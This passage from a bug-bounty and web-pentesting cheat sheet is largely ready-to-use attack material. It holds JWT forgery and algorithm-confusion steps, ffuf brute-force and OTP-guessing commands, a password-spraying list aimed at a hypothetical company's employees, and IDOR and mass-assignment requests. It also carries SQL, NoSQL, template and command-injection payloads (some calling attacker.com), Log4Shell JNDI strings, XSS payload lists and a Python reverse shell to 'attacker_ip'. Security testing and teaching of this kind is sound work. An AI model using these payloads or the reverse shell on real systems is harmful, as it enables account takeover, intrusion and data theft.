# - Auth flows are complex; small parsing discrepancies leak sensitive tokens
```

### 🔓 Magic Link Bypass (Tip #71)

```bash
# Technique: Parameter pollution/tampering in passwordless authentication.
# Payloads:
# Appending &email=victim@email.com to the token validation endpoint
POST /auth/magic-link/verify?token=VALID_TOKEN&email=victim@email.com

# Also test:
# - Reusing magic link tokens multiple times
# - Using magic link for a different email than requested
# - Race condition on token validation
# - Token prediction (sequential, timestamp-based)
# - Magic link not expiring after use

# Philosophy: Analyze how auth endpoints handle duplicate or extra parameters;
# logic flaws often lead to account takeovers.
```

### 🔑 JWT Hunting Tips (Tip #13)

```bash
# Decode every JWT. Check:
alg    → Algorithm (none? HS256? RS256?)
kid    → Key ID (path traversal? injection?)
jku    → JWK Set URL (SSRF? redirect?)
x5u    → X.509 URL (SSRF?)
exp    → Expiration (too long? missing?)
aud    → Audience (wrong audience accepted?)
iss    → Issuer (spoofable?)

# Most findings come from incorrect validation,
# NOT from "cracking" JWTs.
# Understanding how the server verifies tokens is far more
# valuable than reading the payload.

# JWT Attack Payloads (Tip #35):
{"alg":"none"}                          # No signature required
HS256 → RS256 confusion                 # Sign with public key as HMAC secret
kid="../../../../dev/null"              # Path traversal in key lookup
kid="|/bin/uname"                       # Command injection in key lookup
Empty signature tokens                  # Remove sig, keep header.payload.
```

### 🔑 JWT None Algorithm → Authentication Bypass (Tip #39)

```bash
# POC:
# 1. Captured JWT token from request
# 2. Changed algorithm to "none" (also try "None", "NONE", "nOnE")
# 3. Removed token signature
# 4. Server accepted forged token

# Example:
# Original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
# Forged:   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

# Learning:
# - Never allow "none" algorithm in JWT verification
# - Strictly validate token signatures
# - Use allowlist of accepted algorithms
# - Test case variations: none, None, NONE, nOnE
```

### 🔑 JWT Algorithm Confusion (Tip #76)

```bash
# Technique: Forcing the server to verify an RSA-signed JWT using symmetric HMAC.
# POC:
# 1. Original JWT uses RS256 (asymmetric)
# 2. Changed header to {"alg":"HS256"} (symmetric)
# 3. Signed the JWT using the server's PUBLIC RSA key as the HMAC secret
# 4. Server used public key to verify HMAC → accepted forged token

# Why it works:
# - Server sees alg=HS256, uses the configured "key" for HMAC verification
# - If the "key" is the RSA public key (which is public!), attacker can sign anything
# - The public key is often available at /.well-known/jwks.json or in the JWT header (jku/x5u)

# Philosophy: Cryptographic implementation flaws arise when developers mix
# asymmetric and symmetric algorithms without strict type checking.
```

### Email Verification Bypass

```bash
- Back button after verification screen → login without verify
- Direct API login skips verification check
- Scanner bots auto-click verification links → ATO without human
- Race condition on email change → verified without ownership
- No verification on invite accept → owner takeover
- Soft email confirmation → HTML injection in admin dialog
- Resend verification to arbitrary email from query param
```

### Credential Leakage Vectors

```bash
- .netrc + redirect → password leaked to redirect target
- Authorization/Cookie/Proxy-Authorization not stripped on cross-origin redirect
- Same-host different-port leak (curl CVE-2022-27776)
- HTTP→FTP cross-protocol leak (curl CVE-2022-27774)
- directDownloadUrl auto-attach Basic auth to attacker server
- Host header injection → token forwarded to attacker
- Referer leakage of reset tokens/OAuth codes
- CI logs (Travis, TeamCity) leaking tokens
- Public GitHub (hardcoded in Constants.kt, Steps.py)
- Slack channels with hardcoded Jira tokens
- x-sendfile header leaking internal paths
- Service worker JS leaking userId cross-origin
```

### 🔑 API Authentication Attacks (from API Pentesting Blog)

```bash
# Password Brute-Force via API:
# Same as traditional brute-force but:
# - Request sent to API endpoint
# - Payload is often JSON
# - Auth values may require base64 encoding
ffuf -w passwords.txt:PASS -w emails.txt:EMAIL \
  -u http://target/api/v1/authentication/sign-in \
  -X POST -H "Content-Type: application/json" \
  -d '{"Email": "EMAIL", "Password": "PASS"}' \
  -fr "Invalid Credentials" -t 100

# Password Spraying (evades lockout policies):
# If lockout = 10 attempts, craft 9 most likely passwords
# Categories:
# Obvious: QWER!@#$, Password1!, Season+Year+Symbol
#   Winter2025!, Spring2025?, Fall2025!, Autumn2025?
# Target-specific: Capitalized word + number + org detail + symbol
#   Twitter@2025, Musk@2025, March212006!

# Example password-spraying list for a hypothetical Twitter employee target:
Summer2025!
Spring2025!
QWER!@#$
March212006!
July152006!
Twitter@2025
JPD1976!
Musk@2025

# OTP Brute-Force (when email is known):
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
  -u 'http://target/api/v1/passwords/resets' \
  -H 'Content-Type: application/json' \
  -d '{"Email":"victim@mail.com","OTP":"FUZZ","NewPassword":"Admin@123"}' \
  -fr "false"

# Confirm with found OTP:
curl -X 'POST' \
  'http://target/api/v1/passwords/resets' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{"Email":"victim@mail.com","OTP":"7454","NewPassword":"Admin@123123"}'

# Token Analysis with Burp Sequencer:
# 1. Proxy auth request into Burp
# 2. Right-click → Send to Sequencer
# 3. Define custom token location in response (Configure → Custom Location)
# 4. Live Capture → analyze thousands of tokens
# 5. Check Character-level analysis for predictability
# Bad token example: 12-char alphanumeric, first 8 identical,
#   last 3 = two lowercase + one number (aa#) → brute-forceable in <7000 requests
# Practice with known bad tokens:
# https://raw.githubusercontent.com/hAPI-hacker/Hacking-APIs/main/bad_tokens
# Use Manual load option to provide custom token set

# JWT Attacks (API-Specific):
# JWT identification: three base64 segments separated by periods, starts with "ey"
# JWT.io is a free web-based JWT debugger
# Tool: jwt_tool
python3 jwt_tool.py <token> -t https://target/api -M at
# -M pb → playbook audit (default tests)
# -M at → perform ALL tests
# -rc   → add request cookies
# -rh   → add request headers
# -pd   → add POST data
# Full JWT attack reference: https://github.com/ticarpi/jwt_tool/wiki
# Full JWT breakdown: https://l1nuxkid.gitbook.io (All About JWT)
```

---

## 4. AUTHORIZATION & IDOR

### The Universal Pattern

> Server trusts a client-supplied identifier without verifying the requester owns/has permission on that resource.

### 🔐 Authentication ≠ Authorization (Tip #6)

```bash
# Request:
GET /api/user/123
→ 403

# Now try the same endpoint with a different low-privileged account.
# If one regular user can access another user's resources,
# you may have discovered Broken Access Control (BAC).

# Always test access:
✓ Unauthenticated (no token at all)
✓ Low → High (regular user accessing admin endpoints)
✓ High → Low (admin accessing another admin's data)
✓ Cross-user (User A accessing User B's resources)

# Privilege boundaries are where real bugs hide.
# A different response code alone isn't a vulnerability—
# confirm UNAUTHORIZED ACCESS and IMPACT.
```

### Testing Methodology

```bash
Create two accounts (A and B) in same tenant/role
Capture every request with an ID (path, body, header, cookie)
Swap A's ID for B's → observe
Then try cross-tenant (different org/store/team)
Then try cross-role (member→admin, staff→owner)
Then try unauthenticated
```

### 🔐 API Endpoint Replay Testing (Tip #2)

```bash
# When you discover a new API endpoint, don't just test the request you found.
# Replay it with:
- Another user's ID
- Another HTTP method (GET → POST → PUT → PATCH → DELETE)
- Different Content-Type values (application/json → application/xml → text/plain)
- Missing parameters (remove required fields)
- Extra JSON fields (add "role":"admin", "is_admin":true)
- Array instead of scalar ({"id":1} → {"id":[1,2,3]})
- Null values ({"id":null})
- Empty body vs populated body
- Different API versions (/api/v1/ vs /api/v2/)

# Many authorization bugs only appear after changing the request shape.
```

### 🔐 Missing Authorization → API Data Exposure (Tip #43)

```bash
# POC:
# 1. Found API endpoint /api/users
# 2. Sent request without authentication (no token, no cookie)
# 3. Server returned full user data
# 4. No auth check was implemented

# Common patterns:
# - Internal APIs accessible without auth from external network
# - API endpoints that assume the gateway handles auth (but it doesn't)
# - Microservice-to-microservice calls exposed publicly
# - GraphQL queries that skip auth on certain resolvers
# - WebSocket connections that don't verify session on upgrade

# Test EVERY endpoint without any authentication headers.
```

### 🔐 Mass Assignment → Privilege Escalation (Tip #27)

```bash
# POC:
# 1. Intercepted profile update API request
# 2. Added hidden field "role":"admin"
# 3. Server accepted unexpected parameter
# 4. Account gained elevated privileges

# Common mass assignment targets:
{"role":"admin"}
{"is_admin":true}
{"verified":true}
{"plan":"enterprise"}
{"permissions":["*"]}
{"account_type":"premium"}
{"status":"active"}
{"approved":true}
{"level":99}
{"credits":999999}

# Learning:
# - Whitelist allowed fields on APIs (strong parameters in Rails, DTOs in Java)
# - Ignore client-supplied privilege parameters
# - Test by adding extra fields to every POST/PUT/PATCH request
```

### 🔐 WebSocket Auth Bypass (Tip #79)

```bash
# Technique: Accessing private data via unauthenticated WebSocket channels.
# POC:
# Connected to wss://api.victim.com/ws
# Sent: {"action":"subscribe","channel":"user_123_private"}
# Without session cookies → received private data

# Testing:
# 1. Find WebSocket endpoints (wss:// in JS files, network tab)
# 2. Connect WITHOUT authentication cookies/tokens
# 3. Try subscribing to other users' channels
# 4. Try sending messages as other users
# 5. Check if auth is only on HTTP upgrade, not on message frames

# Philosophy: Auth checks on the initial HTTP upgrade request don't guarantee
# authorization on subsequent WebSocket message frames.
```

### IDOR Variants

```bash
# Numeric sequential IDs
/download.aspx?id=4675 (increment)
/gift/share/?giftId=559078 (increment by 2)
/api/v2/order_deliveries/261972220/order_change_logs

# UUIDs in GraphQL
node(id: "gid://hackerone/PolicyPageAssetGroup/3981-41287")
mlModel(id: "gid://gitlab/Ml::Model/1000401")
deleteStorySnaps(ids: ["TARGET_ID"], storyType: "SPOTLIGHT_STORY")

# Polymorphic associations
noteable_id not scoped to project
subject_id in link list forms
parent_id in child epics across groups

# Hidden form fields
purchase_order_id + email → exfiltrate PO PDF
orderKeys in stats query → other users' orders
selectedAddressId cookie → enumerate addresses

# Wildcard list endpoints
/api/v1/dags/~/dagRuns/~/taskInstances/list

# Reference resolution
[#O3599995137|Order] in comments → restricted resource summary
{F1718695} in commit messages → restricted file becomes public

# Email/PID as identifier
/api/v1/users/<email> → recovery hint without auth

# Format variants (append to private resources)
.js, .json, .csv, .pdf, .zip
/terms_acceptance_data.csv → private program existence oracle
/profile_metrics.json → hidden response efficiency data

# Search while logged out
Group search bypasses project visibility (GitLab)

# Export/clone/copy operations bypass ACLs
Clone board bypasses creation restriction
Copy locked folder bypasses lock
Restore old versions bypasses read-only
File transformations make private files public

# Thumbnails/previews bypass
/publicpreview.php?t=<id> → password-protected share bypass
Video thumbnail endpoint → private video preview
```

### 🔐 IDOR Testing via Sequential IDs (Tip #16)

```bash
# Only tested: GET /api/profile?id=123
# Also try:
GET /api/profile?id=124
GET /api/profile?id=125
GET /api/profile?id=1000
GET /api/profile?id=0
GET /api/profile?id=-1
GET /api/profile?id=999999999

# If you can access another user's data without proper authorization,
# you may have found an IDOR (Insecure Direct Object Reference).
# Changing an ID alone isn't a vulnerability - Unauthorized access IS.
# Note: Only test on authorized targets and never access or retain sensitive data.

# Additional IDOR vectors:
# - UUIDs: try other users' UUIDs (found via other endpoints)
# - Composite keys: /api/org/123/user/456 → try /api/org/123/user/789
# - Encoded IDs: base64, hex, hashids → decode, modify, re-encode
# - GraphQL node queries: node(id:"gid://app/User/123")
```

### Function-Level Access Control

```bash
# UI vs API Discrepancy (most common pattern)
- UI shows "Permission Denied" but backend API allows it
- Staff without "Manage Themes" → /services/v2/themes/submission/new
- Members can view billing/cancel subscription (should be owner-only)
- Read-only users can restore old versions (write-equivalent)
- Moderators can delete editor's scheduled posts via API
- Viewing-only user can POST messages to chat room
- Low-privilege staff can edit packing slip templates
- Full-access admin can create restricted users (hidden capability)

# Deprecated APIs
- owners.query bypasses object view policy
- Old API versions lack newer auth checks
- Deprecated endpoints still enforce old (weaker) permissions

# Testing Strategy
- Intercept all requests, modify method/endpoint
- Access endpoints directly without UI navigation
- Test with lower-privilege roles on every endpoint
- Check deprecated APIs
- Test GET → POST → DELETE method switching
- Test Content-Type switching (JSON → form-urlencoded)
```

### Key IDOR Payloads

```bash
POST /api/v2/list_users {"list_user":{"list_id":VICTIM,"email":"attacker@x.com"}}
DELETE /reports/<id>/external_users/<ARBITRARY_USER_ID>
PUT /ocs/v2.php/apps/files_sharing/api/v1/shares/<id> {"expireDate":"2099-01-01"}
PATCH /api/v2.0/accounts/.../ads/... {"admin_approval":"APPROVED","effective_status":"ACTIVE"}
POST /messages {"message":{"purchase_order_id":"VICTIM","to":"attacker@evil.com"}}
GraphQL: {"query":"{node(id:\"gid://hackerone/.../1\"){...on X{id,name}}}"}
```

### 🔐 BOLA / BFLA / Mass Assignment — API-Specific (from API Pentesting Blog)

```bash
# === BROKEN OBJECT LEVEL AUTHORIZATION (BOLA) ===
# Three ingredients for exploitation:
# 1. Resource ID (number, UUID, name)
# 2. Requests that access resources
# 3. Missing or flawed access controls (MUST be tested)

# Finding Resource IDs:
GET /api/resource/1
GET /user/account/find?user_id=15
POST /company/account/Apple/balance
POST /admin/pwreset/account/90

# Testing: alter ID values
GET /api/resource/3
GET /user/account/find?user_id=23
POST /company/account/Google/balance
POST /admin/pwreset/account/111

# Practical BOLA example (OWASP API1):
for ((i=1; i<=200; i++)); do
  curl -s -X 'GET' \
    "http://target/api/v1/suppliers/quarterly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer <TOKEN>' | jq .
done

# === BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA) ===
# Key difference from BOLA:
# BOLA = authorized to use endpoint, but accesses wrong OBJECT
# BFLA = NOT authorized to invoke the endpoint AT ALL

# BFLA hunting: focus on POST, PUT, DELETE (actions that alter resources)
POST /workshop/api/shop/orders/return_order?order_id=5893280
PUT /identity/api/v2/user/videos/:id
POST /community/api/v2/community/posts/.../comment

# A-B-A Testing Methodology for BFLA:
# 1. Make valid requests as UserA
# 2. Switch to UserB's token
# 3. Attempt to alter UserA's resources
# 4. Switch back to UserA to verify success
# ⚠️ Do NOT brute-force BFLA — use secondary account against your own resources
# ⚠️ Deleting other users' resources in production violates most rules of engagement

# Impact assessment thinking:
# return_order → attacker returns anyone's orders (devastating for low-return business)
# video update → create/update/delete any user's videos (trust damage)
# comment posting → legitimate business purpose, low risk (don't waste time)

# === MASS ASSIGNMENT (API3: Broken Object Property Level Authorization) ===
# Conditions: API accepts input + input alters hidden values + no security controls
# Also called "auto-binding" — frameworks bind request params to internal object fields

# Classic example: add "isadmin":"true" during registration

# Identifying hidden parameters:
# If PATCH /api/users/ accepts {"username":"x","email":"y"}
# And GET /api/users/123 returns {"id":123,"name":"John","email":"j@x.com","isAdmin":"false"}
# Then "id" and "isAdmin" are likely bound to the internal object

# Testing Mass Assignment:
# Step 1: Add enumerated field with valid value
{"username":"wiener","email":"w@x.com","isAdmin":false}
# Step 2: Send invalid value to test processing
{"username":"wiener","email":"w@x.com","isAdmin":"foo"}
# Step 3: If different behavior → parameter is processed → exploit:
{"username":"wiener","email":"w@x.com","isAdmin":true}
# Confirm by browsing app as wiener to check for admin functionality

# Practical Mass Assignment (discount manipulation):
# Original response:
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":2,"item_price":133700}]}
# Attack:
POST /api/checkout
Content-Type: application/json
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":2,"item_price":133700}]}

# Practical Mass Assignment (role escalation - OWASP API3):
curl -X PATCH http://target/profile \
  -H "Authorization: Bearer <customer_token>" \
  -H "Content-Type: application/json" \
  -d '{"role": "Employee"}'

# Automating with Param Miner:
# Right-click request → Extensions → Param Miner → Guess params → Guess JSON parameter
# Check Extender → Extensions → Param Miner → Output tab
# Insert discovered params back into request and fuzz
```

---

## 5. INJECTION VULNERABILITIES

### SQL Injection

```bash
# Beyond Standard SQLi — Where to Look
- Path parameters: /api/.../number_trips/1/999%20or%201=1--
- Cookie values (reviews.zomato.com time-based)
- JSON/array parameters: brids=["')/**/OR/**/MID(...)"]
- Android ContentProvider projection/selection
- ORM column aliases via JSONField keys (Django QuerySet.values())
- ORDER BY via reorder() params (GitLab MilestoneFinder)
- XML-formatted HTTP requests (Microsoft Dynamics AX)
- Salesforce Aura API: entityNameOrId parameter
- SOLR injection: {!dismax+df=city_id}86

# Techniques
- Boolean blind: compare or 1=1-- vs or 1=2-- (response length/status)
- Time-based: SLEEP(6), CASE WHEN ... THEN SLEEP
- Error-based: extract info from error messages
- UNION-based: extract data via UNION SELECT
- Stacked queries: ; DROP TABLE users; --
- Second-order: store payload, trigger later

# WAF Bypass for SQLi
- /**/ comments instead of spaces
- %23 (#) for comment
- Case variation: SeLeCt
- sqlmap tamper scripts
- Double URL encoding
- JSON parameter smuggling

# Payloads (Tip #35)
' OR '1'='1
admin' --
' UNION SELECT NULL,NULL,NULL--
' AND SLEEP(5)-- -
'||(SELECT pg_sleep(5))||
1 WAITFOR DELAY '0:0:5'
' UNION SELECT @@version--
' OR updatexml(1,concat(0x7e,user()),1)--

# Advanced payloads
entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23
brids=["')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23"]
order=(CASE SUBSTR((SELECT email FROM users LIMIT 1),1,1) WHEN 'a' THEN id ELSE 1 END)
content://org.nextcloud/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
```

### 🔉 Second-Order SQL Injection (Tip #73)

```bash
# Technique: Storing payload safely in one field, triggering execution in another.
# POC:
# 1. Stored ' OR 1=1 -- in username field during registration
# 2. Server safely stored it (parameterized INSERT)
# 3. During password reset, server searched: "SELECT * FROM users WHERE username='$input'"
# 4. The stored payload executed in the UNSAFE second query

# Where to look:
# - Registration → admin panel search
# - Profile update → report generation
# - Comment submission → email notification query
# - File upload name → log search
# - Any stored data that is later used in a dynamic query

# Philosophy: Don't just test immediate reflection. Data stored safely may be
# used unsafely later in different contexts.

# Testing:
# 1. Store SQLi payloads in every input field
# 2. Trigger every function that READS that stored data
# 3. Monitor for errors, timing differences, or data leakage
```

### 🔉 NoSQL Injection → Authentication Bypass (Tip #41)

```bash
# POC:
# 1. Tested login request with JSON input
# 2. Injected {"$ne": null} in password field
# 3. Database query logic was bypassed
# 4. Logged in without valid credentials

# Payloads:
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"$where": "this.username == 'admin'"}

# Also test:
# - Array injection: {"username": ["admin"], "password": ["x"]}
# - $regex operator for enumeration
# - $where with JavaScript expressions
# - Nested operators: {"$and": [{"username": "admin"}, {"password": {"$ne": ""}}]}

# Learning:
# - Sanitize database queries properly
# - Never trust raw user input in queries
# - Use allowlists for operators
```

### 🔉 API-Specific Injection Techniques (from API Pentesting Blog)

```bash
# === SQL INJECTION IN APIs ===
# Useful SQL metacharacters for API fuzzing:
'
''
;%00              # null byte → verbose SQL error
--
-- -
""
;
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
OR 1=1

# Authentication bypass example:
# Original: SELECT * FROM userdb WHERE username='hAPI' AND password='Pass1!'
# Inject:   ' OR 1=1-- -  as password
# Result:   SELECT * FROM userdb WHERE username='hAPI' OR 1=1-- -
# → selects user on true condition, skips password check (commented out)
# Can be attempted against both username and password fields

# === NoSQL INJECTION (APIs commonly use NoSQL) ===
# Less well-known than SQLi → more likely unpatched
# "NoSQL" simply means "not SQL" — each database has unique structures
# Common MongoDB metacharacters:
$gt     {"$gt":""}     {"$gt":-1}      # selects docs greater than value
$ne     {"$ne":""}     {"$ne":-1}      # selects docs not equal to value
$nin    {"$nin":1}     {"$nin":[1]}    # "not in" — field value not in array
{"$where": "sleep(1000)"}              # causes delay/verbose error

# === OS COMMAND INJECTION IN APIs ===
# Knowing target's OS helps — use Nmap scans during recon
# Command separators (chain multiple commands):
|  ||  &  &&  '  "  ;  '"  `  $()

# Use two payload positions: separator + OS command
# Target: URL query strings, request parameters, headers
# Focus on parameters that threw OS-related errors during fuzzing

# === STRING TERMINATORS (bypass security filters) ===
# Null bytes and symbols interpreted as string terminators:
%00  0x00  //  ;  %  !  ?  []  %5B%5D
%09  %0a  %0b  %0c  %0e

# Can be placed in various parts of request (path, POST body) to bypass restrictions
# Example: null byte before SQLi to bypass validation:
POST /api/v1/user/profile/update
{"uname":"hapihacker","pass":"%00'OR 1=1"}

# === SERVER-SIDE PARAMETER POLLUTION ===
# When user input is embedded into server-side requests to internal APIs
# Can: override existing params, modify behavior, access unauthorized data
# Test: query params, form fields, headers, URL path parameters

# Testing in Query String:
# Browser request: GET /userSearch?name=peter&back=/home
# Internal API:    GET /users/search?name=peter&publicProfile=true
# Inject # (URL-encoded): truncates internal request → removes publicProfile=true
# Inject & (URL-encoded): adds parameters to internal request
GET /userSearch?name=peter%26foo=xyz&back=/home
# Internal: GET /users/search?name=peter&foo=xyz&publicProfile=true
# Override existing params:
GET /userSearch?name=peter%26name=carlos&back=/home
# Internal: GET /users/search?name=peter&name=carlos&publicProfile=true
# PHP → last value (carlos), ASP.NET → combined, Node.js/Express → first value

# Injecting Valid Parameters:
GET /userSearch?name=peter%26email=foo&back=/home
# Internal: GET /users/search?name=peter&email=foo&publicProfile=true

# Testing in REST Paths:
# Internal: GET /api/private/users/peter
# Inject path traversal:
GET /edit_profile.php?name=peter%2f..%2fadmin
# Internal: GET /api/private/users/peter/../admin → resolves to /api/private/users/admin

# Testing in Structured Data Formats (JSON/XML):
# Internal: PATCH /users/7312/update {"name":"peter"}
# Inject:
POST /myaccount
name=peter","access_level":"administrator
# Internal becomes: {"name":"peter","access_level":"administrator"}
# Could grant administrator access

# Tools: Backslash Powered Scanner BApp (classifies inputs: boring, interesting, vulnerable)
# Reference wordlist: burp-payloads/Server-side variable names.pay

# Prevention: allowlist characters, encode all user input before server-side request,
# validate input matches expected format and structure

# === CASE SWITCHING (rate limit bypass for IDOR brute-force) ===
# Some security controls key off literal spelling/case:
POST /api/myprofile     → uid 001-100
POST /api/Myprofile     → uid 101-200
POST /api/mYprofile     → uid 201-300
# Use Burp Pitchfork attack to pair case variants with ID ranges
# If rate-limiting bypassed entirely → send unlimited requests with case switched
# If just renewed per variant → Pitchfork pairs set number of attempts per variant

# === ENCODING PAYLOADS (WAF Evasion for APIs) ===
# Single URL encoded (WAF catches):
%27%20%4f%52%20%31%3d%31%3b  →  ' OR 1=1;
# Double URL encoded (WAF misses):
%25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62
# Backend decodes once → %27%20%4f%52... → decodes again → ' OR 1=1;

# Burp Payload Processing:
# Under Intruder → Payload Processing:
# Add rules: prefix, suffix, URL-encode, hash, match-and-replace
# Order matters: encode FIRST, then add null bytes (so they aren't encoded)
# Rules applied top-to-bottom

# Wfuzz encoding:
wfuzz -e encoders                    # list all encoders
wfuzz -z file,wordlist.txt,base64    # base64 encode each payload
wfuzz -z list,TEST,base64-md5-none   # chain multiple encoders
# Available encoders: base64, urlencode, random_upper, md5, hexlify, none
# MORE: https://github.com/0xInfection/Awesome-WAF
```

### 🔉 SSTI to RCE in URL (Tip #56)

```bash
# POC:
# http://target.com/docs/1.0/123          → not found
# http://target.com/docs/1.0/?123         → reflecting in source: /docs/1.0/?123#
# http://target.com/docs/1.0/?{{7*7}}     → /docs/1.0/?49#
# ☑️ RCE: /docs/1.0/?{{phpinfo()}}

# SSTI Payloads (Tip #35):
{{7*7}}
{{config.items()}}
${7*7}
<%= 7*7 %>
{{self.__init__.__globals__}}
{{request.application.__globals__}}
${{<%[%'"}}%\

# Detection methodology:
# 1. Find parameters reflected in response
# 2. Test {{7*7}} → if 49 appears, template injection confirmed
# 3. Identify the engine (Jinja2, Twig, Freemarker, ERB, etc.)
# 4. Escalate to RCE using engine-specific payloads

# Where to test:
# - URL path segments
# - Query parameters
# - Error messages that reflect input
# - Email templates
# - PDF generators
# - Any "template" or "format" parameter
```

### Command Injection

```bash
# Common Injection Points
- File upload filename: test.txt;wget attacker.com
- Hostname in SSH ProxyCommand: backticks, $(), ;, |
- Git flag injection: --upload-pack=touch${IFS}hack
- Git ref injection: --output=/var/opt/gitlab/.ssh/authorized_keys
- run_id in Airflow DAGs: `touch /tmp/success`
- sql_proxy_version: ../evil?a= (path traversal → binary download)
- env variable NAMES (not values): "test2 --help ; whoami ;"
- ImageMagick parameters: mini_magick backend
- JDBC URLs: jdbc:mysql://attacker/malicious (LOAD DATA LOCAL INFILE)
- Shell interpolation: "gzip -dc #{@path} | wc -c"
- Kafka SASL JAAS: JndiLoginModule → LDAP → deserialization
- Ingress-nginx annotations: Lua content_by_lua_block
- Nginx path field: log_format + access_log + include → Lua RCE
- Pathname pipe: Pathname("|touch x").binread

# Bypass Techniques
- ${IFS} instead of spaces
- Backticks, $(), ;, | for shell metacharacters
- Newline injection: %0a, %0d%0a
- URL encoding: %3B for ;, %7C for |
- Alternative syntax: cat${IFS}/etc/passwd
- -- before user args in git commands (defense)

# Payloads (Tip #35):
;id
&& whoami
| uname -a
$(id)
`whoami`
; curl http://attacker.com
|| ping -c 4 127.0.0.1
%0Aid
```

### 🖥️ Python Reverse Shell (Tip #60)

```python
# Remote Code Execution (RCE) reverse shell:
import socket
import os
import pty
RHOST = "attacker_ip"
RPORT = 4433
s = socket.socket()
s.connect((RHOST, RPORT))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")

# Listener:
# nc -lvnp 4433
# NOTE: Only use on authorized targets.
# This is useful for demonstrating RCE impact in bug bounty reports.
```

### Template Injection

```bash
# Jinja2 / Python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
Airflow run_id → str.format():
  {ti.task.__class__.__init__.__globals__[conf].__dict__}

# Rails ERB / Liquid
<%= `id` %>
{{ methods | json }}
{{ systemu }}
{{ to_yaml }}
t(".title_html", default: "<script>alert('XSS')</script>")

# AngularJS (legacy)
{{constructor.constructor('alert(1)')()}}

# Elasticsearch Painless
[{"_script":{"type":"number","script":{"source":"doc[\"_seq_no\"].value","lang":"painless"}}}]
```

### LDAP / JNDI Injection

```bash
# Log4Shell (CVE-2021-44228)
${jndi:ldap://attacker.com/exploit}
${jndi:ldap://${hostName}.uri.burpcollaborator.net/a}
Inject in ALL headers: User-Agent, X-Forwarded-For, X-Api-Version, Referer

# Kafka Connect SASL JAAS
com.sun.security.auth.module.JndiLoginModule required
  user.provider.url="ldap://attacker_server"
  useFirstPass="true" serviceName="x" debug="true"
  group.provider.url="xxx";

# SSRF → Jolokia → jvmtiAgentLoad → RCE
```

---

## 6. CLIENT-SIDE VULNERABILITIES

### Cross-Site Scripting (XSS)

#### Where to Inject (High-Yield Fields)

```bash
# User-controlled text fields
Names (first/last/contact/team/group/app/organization)
Notes/description/category/tag fields
Filenames (uploads, shared documents, CSV imports)
Email addresses
Branch names (Git)
IP address fields
Dates/activation fields
Usernames
Project/resource names
Chat messages / DMs
Markdown/rich-text editors
Wiki/RDoc markup
SVG uploads
Error messages/SMTP bounces
URL path segments
Redirect/return parameters
```

#### Reflected XSS Bypass Techniques

```html
<!-- Tag/attribute obfuscation -->
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
<details onauxclick=x=prompt,x`${document.cookie}`></details>
<marquee+width=1000+onauxclick=confirm(document.cookie)>XSS</marquee>
<isindex type=image src=1 onerror=alert(1)>

<!-- Context breakouts -->
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
">]<img src=x onerror=alert(document.domain)>
<!--><svg/onload=alert(document.domain)>     (WAF comment bypass)

<!-- Protocol tricks -->
javascript:alert(1)
javascript://%0aalert(1)                    (newline after //)
javascript:alert%09(document.domain)        (tab char)
data:text/html;base64,PHNjcmlwdD4...
data:text/html;charset=utf-7;base64,...
cid://\00003c...                            (HEY octal bypass)

<!-- Encoding -->
HTML entities: &#34;&#62;&#60;img&#32src=...
Unicode fullwidth: ＜script＞
Unicode homoglyphs: Ꮇozilla (U+13B7)
Backticks: zz`;(alert)();`//

<!-- Multi-parameter mutation (Starbucks) -->
?xtl_coupon_code=1&xtl_amount=x&xtl_amount_type=ayn</script><svg/onload=alert(document.domain)>

<!-- SVG whitelist bypass via entity -->
<!DOCTYPE svg [<!ENTITY elem "">]><svg onload="alert(1)">

<!-- Markdown image XSS -->
![text](javascript:eval(atob('BASE64')))

<!-- Trix editor -->
<div data-trix-attachment="{&quot;content&quot;:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;}">

<!-- Rails sanitizer bypasses -->
<select><style><script>alert(1)</script></style></select>
<math><style><img src=x onerror=alert(1)></style></math>
<svg><use href="data:image/svg+xml;base64,...#x"/></svg>

<!-- AngularJS template injection -->
{{constructor.constructor('alert(1)')()}}

<!-- Prototype pollution → XSS -->
?__proto__.innerHTML=<iframe srcdoc="...">

<!-- DOM via postMessage -->
new File([""], "<img src=xx: onerror=alert(document.domain)>")
{"message":"Shopify.API.Modal.initialize","data":{"src":"javascript:alert(1)"}}

<!-- CSS injection / phishing overlay -->
<a href="http://evil"><span class="btn button button--orange button--wide">Login</span></a>
```

#### 🎯 XSS Payload Collection (Tip #35)

```html
<!-- Core XSS Payloads -->
"><svg/onload=alert(document.domain)>
<iframe src=javascript:alert(1)>
<img src=x onerror=confirm(1)>
<details open ontoggle=alert(1)>
<svg><script>alert(1)</script>
javascript:alert(document.cookie)
'-alert(1)-'
${alert(1)}
{{constructor.constructor('alert(1)')()}}
```

#### 🎯 XSS Trick: Split Payload Across Fields (Tip #58)

```bash
# Split payload across multiple fields.
# Example:
FName=<img src=x
LName=onerror=alert(1)>
# When the app renders FName + LName, your pieces join and fire:
# <img src=x onerror=alert(1)>

# Good to try on:
# - Signup forms (first name + last name)
# - Profile forms (multiple text fields)
# - Address fields (line1 + line2)
# - Company name + department
